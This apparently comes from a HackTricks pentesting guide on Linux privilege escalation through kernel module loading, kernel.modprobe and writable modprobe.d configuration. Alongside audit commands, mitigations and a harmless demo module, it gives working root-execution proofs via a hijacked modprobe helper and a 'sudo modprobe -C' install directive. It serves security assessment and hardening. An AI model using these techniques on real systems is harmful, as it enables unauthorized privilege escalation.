# Kernel Modules と modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module と module-loading の misconfiguration

Kernel module のサポートは、Linux privilege escalation の review において影響の大きい領域です。unsigned module に関するメッセージだけで exploitable と判断せず、実際的な疑問への回答に活用してください。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 現在の user は、`sudo`、capabilities、または writable な helper path を通じて modules を load できるか？
- module loading はまだ有効か？
- module signature enforcement は無効化されているか？
- module directories、module files、または `modprobe.d` configuration paths は writable か？<sup>[[16]](#references)</sup>
- kernel logs を読み取って何が起きたか確認できるか？

Quick triage は、以下の module-status、signature、logging、module-tree checks から始めます。<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
解釈:

- `modules_disabled=1` は、モジュールの load と unload の両方を禁止し、reboot するまで値を `0` に戻せないことを意味します。<sup>[[1]](#references)</sup>
- kernel command line の `module.sig_enforce=1` または `CONFIG_MODULE_SIG_FORCE=y` は、正しく署名されたモジュールを必須にします。それ以外の場合、unsigned module が load され、kernel が taint される可能性があります。<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` は `dmesg` に制限を課しません。`1` の場合、アクセスには `CAP_SYSLOG` が必要です。<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 配下の writable な path は危険です。`modprobe` はモジュールの load 時に、この tree とその dependency data を検索するためです。<sup>[[8]](#references)</sup>

### モジュールの load と kernel output の読み取り

local module を load する正当な permission がある場合、`insmod` は指定した正確な `.ko` file を insert します。モジュールの init function は load の一部として実行され、`printk()` で書き込まれた message は kernel log buffer に送られます。通常、この buffer は `dmesg` で読み取ります。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

最小限の review workflow では、`modinfo` で metadata を inspect し、`insmod` と `rmmod` でモジュールを load および remove し、`lsmod` で load 済みの state を確認し、`dmesg` で kernel log を inspect します。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l` で `insmod`、`modprobe`、またはそれらをラップする wrapper の実行が許可されている場合は、critical とみなしてください。`sudo -l` は実行ユーザーの権限を一覧表示し、kernel module のロードには `CAP_SYS_MODULE` が必要です。直接的な capability ベースの経路については、[Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) を参照してください。<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo で許可された `insmod`

ユーザーに `insmod` の実行を許可する sudo ルールは、通常の管理用ヘルパーの実行を許可する場合とは比較できません。モジュールの初期化コードは挿入の一部として実行されるため、実務上のレビューで問うべきなのは、このユーザーがロードされるモジュールを選択または変更できるかどうかです。<sup>[[3]](#references)</sup>

次の一般的なレビュー手順では、候補モジュールに対して、検査、ロード、状態、ログ、削除に関する各チェックを繰り返します。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
ユーザーが任意の `.ko` を提供できる場合、認可済みの assessment では、このルールはシステム全体の compromise として扱う必要があります。より安全な運用パターンは、sudo を介した module loading の委任を避けることです。避けられない場合は、正確な path、ownership、permissions、signing policy、および removal workflow を制限してください。<sup>[[3]](#references)[[10]](#references)</sup>

管理された lab で harmless な module-building pattern を使用する場合は、以下に minimal source と Makefile を示します。`make -C /lib/modules/$(uname -r)/build M=$PWD` 形式は、external modules に関する kernel の documented kbuild workflow に従っています。<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
認可された lab 内でのみ build および load を行ってください。kbuild は external module を build し、load/remove コマンドは kernel module interfaces を呼び出します。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` は、kernel が module の自動ロード要求時に実行する userspace helper を指定します。この sysctl は明示的な module 挿入ではなく、自動ロードに影響します。攻撃者がこれを書き込み可能な実行ファイルのパスに変更し、module リクエストを発生させられる場合、その helper は特権コード実行経路になります。空の文字列に設定すると自動ロード要求が無効になります。`CONFIG_STATIC_USERMODEHELPER=y` の場合、空でない値はコンパイル時に組み込まれた static helper パスによって上書きされます。<sup>[[1]](#references)</sup>

kernel sysctl インターフェースを通じて現在の helper パスを確認し、対象の所有者と mode を調査します。<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
sysctl、委譲された sudo ルール、またはファイル capability に影響を与えられるか確認します。<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
次の lab-only パターンは helper path を変更し、文書化された module-autoload request をトリガーします。隔離された、承認済みのシステム上でのみ使用してください。<sup>[[1]](#references)</sup>

現在の Linux kernel では、汎用的なトリガーとして未知の executable を使用しないでください。従来の custom binary-format による module autoloading は Linux 6.14 で削除されており、kernel documentation では unknown filesystem type が module-autoload request のパスとして示されています。<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
強化されたシステムでは、権限によって非特権ユーザーによる `kernel.modprobe` への書き込みが阻止されている場合、helper path が書き込み可能でない場合、または module autoloading が無効になっている場合、この処理は失敗するはずです。<sup>[[1]](#references)</sup>

### Writable `modprobe.d` configuration and `sudo modprobe -C`

モジュールを解決する前に、`modprobe` は優先順位に従い、`/etc/modprobe.d`、`/run/modprobe.d`、`/usr/local/lib/modprobe.d`、`/usr/lib/modprobe.d`、`/lib/modprobe.d` などの configuration directories から `.conf` files を読み取ります。優先順位の高い directory にある同名の file は、優先順位の低い directory にある file を隠します。さらに重要なのは、`install <module> <command>` directive が、その module を挿入する**代わりに**任意の shell command を実行することです。したがって、書き込み可能な configuration path は、後から privileged な `modprobe` caller の credentials で実行される delayed command execution につながる可能性があります。kernel module signature enforcement は、この userspace command を認証しません。<sup>[[16]](#references)</sup>

Directory と file の permissions を監査し、effective configuration を確認します。`modprobe -n -v` は、dry-run mode では module を挿入せず、`install`/`remove` command も実行しないため、resolution review に安全に使用できます。現在の kmod documentation では、legacy な `--showconfig` spelling は kmod 36 以降に削除予定とされているため、`modprobe -c` を優先してください。<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
`modprobe` に対する無制限の sudo ルールは、任意の `.ko` ファイルが署名検証を通過できない場合でも exploit 可能です。`-C` で攻撃者が制御する設定ディレクトリを指定でき、そこから sudo によって起動されたプロセスが `install` コマンドを実行できます。<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
緩和策として、引数に制限のない `modprobe` を sudo 経由で許可せず、すべての設定ディレクトリを root 所有かつ書き込み不可にし、予期しない `install`/`remove` ディレクティブを確認します。信頼できる管理ワークフローで、1 つのモジュールについてそのようなディレクティブをバイパスする必要がある場合、`modprobe --ignore-install` は指定したモジュールに対してそれらを無視しますが、依存関係にあるモジュールには独自のコマンドが存在する可能性があります。<sup>[[8]](#references)[[16]](#references)</sup>

### 書き込み可能な `/lib/modules` の確認

書き込み可能なモジュールディレクトリでは、後から `modprobe` がどのように呼び出されるかによって、モジュールの置き換え、悪意のあるモジュールの配置、または自動ロードの悪用が可能になる場合があります。`modprobe` はモジュールの解決時に `/lib/modules/$(uname -r)` を検索し、その依存関係データを使用します。<sup>[[8]](#references)</sup>

アクティブなカーネルリリースのモジュールツリー配下にある、書き込み可能なモジュールファイルと依存関係/alias メタデータを確認します。<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
書き込み可能なモジュールコンテンツを見つけた場合は、`modprobe` が依存関係を解決する方法と、`modinfo` がモジュールのメタデータを報告する方法を確認します。<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
防御上の注意点:

- `/lib/modules` の所有者を `root:root` に設定し、ユーザーが書き込めないようにする。<sup>[[8]](#references)</sup>
- 運用上可能な場合は、boot 後に `kernel.modules_disabled=1` を設定する。<sup>[[1]](#references)</sup>
- loadable modules が必要なシステムでは、module signing を強制する。<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`、`/lib/modules`、`modprobe.d` の設定ディレクトリへの書き込みに加え、予期しない `insmod`/`modprobe` の実行を監視する。<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [/proc/sys/kernel/ のドキュメント — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux manual page](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — The Linux Kernel documentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Message logging with printk — The Linux Kernel documentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — The Linux Kernel documentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux manual page](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
